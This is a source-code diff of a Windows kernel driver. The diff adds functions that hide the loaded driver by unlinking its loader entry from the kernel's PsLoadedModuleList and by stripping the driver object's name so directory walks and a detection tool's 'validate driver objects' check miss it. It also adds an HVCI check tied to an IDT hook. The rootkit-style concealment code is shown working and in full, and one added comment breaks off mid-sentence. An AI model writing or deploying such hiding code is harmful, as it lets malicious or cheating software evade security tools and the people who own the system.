@@ -76,8 +76,10 @@ address EnumerateKProcess(const wchar_t *ProcessName, const uint64_t PID = -1)
     print(INFO("Target KProcess Name: %ws"), ProcessName);
     print(INFO("Target PID: %p"), PID);
 
-    // Init variables for loop
-    _LIST_ENTRY *pHead = (_LIST_ENTRY *) *__imp_PsLoadedModuleList;
+    // Init variables for loop. Reading __imp_PsLoadedModuleList itself yields the value in the import slot: the
+    // address of PsLoadedModuleList, the list head. Dereferencing the identifier (*...) would name the first
+    // module instead of the head, which skips ntoskrnl and makes the loop walk garbage
+    _LIST_ENTRY *pHead = (_LIST_ENTRY *) __imp_PsLoadedModuleList;
     _LIST_ENTRY *pCurrent = pHead->Flink;   // the list head is not a module
 
     _KLDR_DATA_TABLE_ENTRY *entry;
@@ -106,6 +108,142 @@ address EnumerateKProcess(const wchar_t *ProcessName, const uint64_t PID = -1)
     // Not Found
     print(ERROR("%ws NOT FOUND!"), ProcessName);
     return nullptr;
+}
+
+// Kernel object-manager functions for driver-object hiding. Declared here because the vendor headers do not
+// include them; the signatures are the kernel's. AccessMode 0 = KernelMode
+extern "C"
+{
+    int32_t ObReferenceObjectByPointer(void *Object, uint32_t DesiredAccess, void *ObjectType, uint8_t AccessMode);
+    void ObMakeTemporaryObject(void *Object);
+    void ObfDereferenceObject(void *Object);
+}
+
+// The driver object we pinned with our own reference, so ObMakeTemporaryObject cannot free it while the driver
+// runs. Held until DriverExit
+void *HeldDriverObject = nullptr;
+
+// Removes the driver object's name from the object directory, so walks of \Driver (the reference tool's
+// "validate driver objects" check) no longer see the driver at all. The image was already unlinked from the
+// module list; this hides the object itself. The object stays alive: ObMakeTemporaryObject just strips the
+// name, and the kernel's own machinery keeps the object referenced while the driver is loaded, plus our pin
+bool HideDriverObject(win::DRIVER_OBJECT *DriverObject)
+{
+    if (!DriverObject) return false;
+    if (HeldDriverObject) return true;
+
+    // Pin: one extra reference of our own. An object whose last reference drops is freed, and our pin guarantee
+    // the object outlives this call no matter what the loader's own bookkeeping does
+    if (ObReferenceObjectByPointer(DriverObject, 0, nullptr, 0) < 0)
+    {
+        print(ERROR("HideDriver: could not reference the driver object"));
+        return false;
+    }
+    HeldDriverObject = DriverObject;
+
+    // Strip the name. From now on, the driver object has no entry in the object directory
+    ObMakeTemporaryObject(DriverObject);
+    print(OK("HideDriver: driver object is now nameless, invisible to object-directory walks"));
+    return true;
+}
+
+// Drops our pin. Called at unload, after everything else: while the code below still runs, nothing must free
+// the object the unload path is driving
+void UnhideDriverObject()
+{
+    if (!HeldDriverObject) return;
+    ObfDereferenceObject(HeldDriverObject);
+    HeldDriverObject = nullptr;
+    print(INFO("HideDriver: object pin released"));
+}
+
+// SystemCodeIntegrityInformation (class 0x67) returns a length and a bit mask of code integrity options
+struct SYSTEM_CODEINTEGRITY_INFORMATION
+{
+    uint32_t Length;
+    uint32_t CodeIntegrityOptions;
+};
+
+constexpr uint32_t SystemCodeIntegrityInformationClass = 0x67;
+constexpr uint32_t CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED = 0x400;
+
+// Declared here because the vendor headers are not in this checkout; the signature is the kernel's
+extern "C" int32_t ZwQuerySystemInformation(uint32_t SystemInformationClass, void *SystemInformation,
+                                            uint32_t SystemInformationLength, uint32_t *ReturnLength);
+
+// Returns true if HVCI (hypervisor-enforced code integrity, "Memory integrity") is on for kernel code.
+// If the query fails, this returns false, which means "not known to be on".
+// HVCI matters for the IDT hook in NMI.cpp: with HVCI on, descriptor table shadowing blocks the gate rewrite,
+// and any test-signed build does not load at all
+bool IsHVCIEnabled()
+{
+    SYSTEM_CODEINTEGRITY_INFORMATION info{};
+    info.Length = sizeof(info);
+
+    int32_t status = ZwQuerySystemInformation(SystemCodeIntegrityInformationClass, &info, sizeof(info), nullptr);
+    if (status < 0) return false;   // NTSTATUS values below zero are errors
+
+    return (info.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED) != 0;
+}
+
+// Removes the driver itself from the kernel's loaded module list, so module walks (PsLoadedModuleList) no longer
+// report it. DriverSection is the loader entry (_KLDR_DATA_TABLE_ENTRY) the kernel created at load time. A manually
+bool UnlinkDriverFromModuleList(win::DRIVER_OBJECT *DriverObject)
+{
+    if (!DriverObject || !DriverObject->DriverSection)
+    {
+        print(ERROR("UnlinkDriver: no DriverObject or DriverSection, nothing to unlink"));
+        return false;
+    }
+
+    auto Entry = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
+    print(INFO("UnlinkDriver: entry %p, DllBase %p, name %ws"), (void *) Entry, Entry->DllBase,
+          Entry->BaseDllName.Length ? Entry->BaseDllName.Buffer : L"");
+
+    // Sanity: the loader entry must describe the driver image itself
+    if ((address) Entry->DllBase != DriverObject->DriverStart)
+    {
+        print(ERROR("UnlinkDriver: entry DllBase %p does not match DriverStart %p"),
+              Entry->DllBase, DriverObject->DriverStart);
+        return false;
+    }
+
+    // Bypass the entry in the doubly linked list, then make its own pointers point at itself, so a later walk that
+    // starts inside this entry does not go anywhere
+    _LIST_ENTRY *Links = &Entry->InLoadOrderLinks;
+    _LIST_ENTRY *Flink = Links->Flink;
+    _LIST_ENTRY *Blink = Links->Blink;
+    if (!Flink || !Blink || Flink == Links || Blink == Links)
+    {
+        print(ERROR("UnlinkDriver: entry links are not connected to the list"));
+        return false;
+    }
+
+    Blink->Flink = Flink;
+    Flink->Blink = Blink;
+    Links->Flink = Links;
+    Links->Blink = Links;
+
+    // Verify: walk the list from the head and confirm the entry is gone. The bound keeps a corrupt list from
+    // turning this into an endless walk
+    _LIST_ENTRY *Head = (_LIST_ENTRY *) __imp_PsLoadedModuleList;
+    constexpr uint32_t MaxWalk = 4096;
+    uint32_t Count = 0;
+    bool Found = false;
+    for (_LIST_ENTRY *Current = Head->Flink; Current && Current != Head && Count < MaxWalk; Current = Current->Flink)
+    {
+        Count++;
+        if (Current == Links)
+        {
+            Found = true;
+            break;
+        }
+    }
+
+    if (Found) print(ERROR("UnlinkDriver: VERIFY FAILED, entry still reachable from the list head"));
+    else if (Count < MaxWalk) print(OK("UnlinkDriver: verified hidden, %u modules left"), Count);
+    else print(WARN("UnlinkDriver: verify walk did not end cleanly after %u steps"), MaxWalk);
+    return true;
 }
 
 // True if the process's image path ends in ProcessName, with a '\' before it. Only the file name counts, not the directory
@@ -412,29 +550,3 @@ address FindFuncExports(address BaseAddress, const char *FuncName)
     return nullptr;
 }
 
-// SystemCodeIntegrityInformation (class 0x67) returns a length and a bit mask of code integrity options
-struct SYSTEM_CODEINTEGRITY_INFORMATION
-{
-    uint32_t Length;
-    uint32_t CodeIntegrityOptions;
-};
-
-constexpr uint32_t SystemCodeIntegrityInformationClass = 0x67;
-constexpr uint32_t CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED = 0x400;
-
-// Declared here because the vendor headers are not in this checkout; the signature is the kernel's
-extern "C" int32_t ZwQuerySystemInformation(uint32_t SystemInformationClass, void *SystemInformation,
-                                            uint32_t SystemInformationLength, uint32_t *ReturnLength);
-
-// Returns true if HVCI (hypervisor-enforced code integrity, "Memory integrity") is on for kernel code.
-// If the query fails, this returns false, which means "not known to be on".
-bool IsHVCIEnabled()
-{
-    SYSTEM_CODEINTEGRITY_INFORMATION info{};
-    info.Length = sizeof(info);
-
-    int32_t status = ZwQuerySystemInformation(SystemCodeIntegrityInformationClass, &info, sizeof(info), nullptr);
-    if (status < 0) return false;   // NTSTATUS values below zero are errors
-
-    return (info.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED) != 0;
-}
